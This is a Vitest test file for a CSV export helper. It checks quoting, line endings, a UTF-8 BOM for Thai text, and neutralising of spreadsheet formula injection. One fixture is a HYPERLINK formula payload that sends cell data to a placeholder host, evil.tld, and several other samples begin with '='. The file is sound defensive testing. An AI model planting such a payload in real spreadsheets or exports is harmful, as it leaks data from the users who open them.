import { describe, it, expect } from "vitest";
import { escapeCell, toCsv } from "./csv";

describe("escapeCell", () => {
  it("passes plain values straight through", () => {
    expect(escapeCell("hello")).toBe("hello");
    expect(escapeCell(42)).toBe("42");
    expect(escapeCell(true)).toBe("true");
  });

  it("renders null/undefined as empty", () => {
    expect(escapeCell(null)).toBe("");
    expect(escapeCell(undefined)).toBe("");
  });

  it("quotes cells containing a comma", () => {
    expect(escapeCell("a,b")).toBe('"a,b"');
  });

  it("quotes and doubles embedded quotes", () => {
    expect(escapeCell('say "hi"')).toBe('"say ""hi"""');
  });

  it("quotes newlines so a cell cannot break the row", () => {
    expect(escapeCell("line1\nline2")).toBe('"line1\nline2"');
    expect(escapeCell("a\r\nb")).toBe('"a\r\nb"');
  });

  it("neutralises spreadsheet formula injection", () => {
    // these would execute in Excel / Google Sheets
    expect(escapeCell("=1+1")).toBe("'=1+1");
    expect(escapeCell("+1")).toBe("'+1");
    expect(escapeCell("-1")).toBe("'-1");
    expect(escapeCell("@SUM(A1)")).toBe("'@SUM(A1)");
  });

  it("neutralises the classic HYPERLINK exfiltration payload", () => {
    const payload = '=HYPERLINK("http://evil.tld?x="&A1,"click")';
    const out = escapeCell(payload);
    // it has commas+quotes, so it is also RFC-quoted: the cell body must start with '
    expect(out.startsWith(`"'=`)).toBe(true);
    // what the spreadsheet ultimately parses (quotes stripped) is not a formula
    const parsed = out.slice(1, -1).replace(/""/g, '"');
    expect(parsed.startsWith("'")).toBe(true);
    expect(parsed).not.toMatch(/^=/);
  });

  it("both defuses and quotes a formula that also has a comma", () => {
    const out = escapeCell("=A1,B1");
    expect(out).toBe(`"'=A1,B1"`);
  });

  it("leaves a negative number written as a number alone-ish but still safe", () => {
    // numbers arrive as numbers from Prisma; a *string* "-5" is still defused
    expect(escapeCell(-5)).toBe("'-5");
    expect(escapeCell("5-3")).toBe("5-3"); // only a *leading* char is dangerous
  });
});

describe("toCsv", () => {
  it("writes a header row and CRLF line endings", () => {
    const csv = toCsv(["a", "b"], [[1, 2]]);
    expect(csv.endsWith("\r\n")).toBe(true);
    expect(csv).toContain("a,b\r\n1,2");
  });

  it("starts with a UTF-8 BOM so Excel reads Thai correctly", () => {
    expect(toCsv(["ชื่อ"], [["สมชาย"]]).charCodeAt(0)).toBe(0xfeff);
  });

  it("handles an empty result set", () => {
    const csv = toCsv(["a", "b"], []);
    expect(csv.replace("﻿", "")).toBe("a,b\r\n");
  });

  it("escapes every cell of every row", () => {
    const csv = toCsv(["x"], [["=evil"], ["a,b"]]);
    expect(csv).toContain("'=evil");
    expect(csv).toContain('"a,b"');
  });

  it("keeps rows aligned when a cell contains a newline", () => {
    const csv = toCsv(["a", "b"], [["x\ny", "z"]]);
    // the newline lives inside quotes, so there are still 2 logical rows
    const logicalRows = csv.replace("﻿", "").trimEnd().split(/\r\n(?=(?:[^"]*"[^"]*")*[^"]*$)/);
    expect(logicalRows).toHaveLength(2);
  });
});
